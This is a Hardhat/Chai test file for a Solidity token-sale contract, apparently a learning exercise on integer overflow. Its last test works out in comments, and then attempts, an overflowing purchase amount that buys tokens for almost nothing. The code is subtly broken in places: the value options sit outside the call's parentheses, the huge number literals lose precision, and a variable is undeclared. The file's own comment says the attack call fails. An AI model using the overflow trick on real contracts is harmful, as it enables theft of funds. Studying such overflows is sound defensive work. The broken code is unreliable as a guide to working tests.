const {assert, expect, AssertionError} = require("chai");
const {network, deployments, ethers} = require("hardhat");
const {developmentChains} = require("../../helper-hardhat-config");
const {BigNumber, parseEther} = require("ethers");
const {
  fromWei,
  contractBalance,
  contractCode,
  getBytePackedVar,
  getArrayItem,
  getUint256,
  getMappingItem,
  toWei,
} = require("../../helpers/helpers.js");

!developmentChains.includes(network.name)
  ? describe.skip
  : describe("Overflow unit test", function () {
      let tokenSale, deployer, acc1, acc2, deposit;
      const maxUint256 = 115792089237316195423570985008687907853269984665640564039457584007913129639935;

      beforeEach(async () => {
        [deployer, acc1, acc2] = await ethers.getSigners();
        deposit = 1; // 1 ether
        const TokenSale = await ethers.getContractFactory("TokenSale");
        tokenSale = await TokenSale.deploy({value: toWei("1"), gasLimit: 4000000});

        /////////////////////////////////////////////////////////////////////
      });

      describe("Integer Overflow", function () {
        it("returns max int value", async () => {
          let val = await tokenSale.getUnitMax();
          assert.equal(maxUint256, val.toString());
        });
        it("sends correct eth amount", async () => {
          // 1 token = 1eth
          let tx = await tokenSale.getMinEthRequired(1, {value: toWei("1")});
          txResult = await tx.wait();
          expect(Boolean(txResult.logs[0].data)).to.eq(true);
        });
        it("manipulates integer overflow vulnerability", async () => {
          // will revert if amount is less than amount * value (1eth)
          // 1 ether = 1e18
          // uint256 max = 115792089237316195423570985008687907853269984665640564039457584007913129639935
          // to get the right amount to multiply it with to get just right above the overflow we divide by 1e18
          // max / 1e18 =
          // 115792089237316195423570985008687907853269984665640564039457
          // this will get us to the last safe value, as solidity has no decimals and the cost is a constant
          // incrementing any further will overflow their product and we will do just that
          // adding 1 to max = 115792089237316195423570985008687907853269984665640564039458
          // which is the lowest value to overflow
          //115792089237316195423570985008687907853269984665640564039458000000000000000000 > 115792089237316195423570985008687907853269984665640564039457584007913129639935
          // This will fail due to ethers.js integer overflow, but can be recreated in remix
          await tokenSale.getMinEthRequired(115792089237316195423570985008687907853269984665640564039458),
            {
              value: toWei("1"),
            };
        });
      });
    });
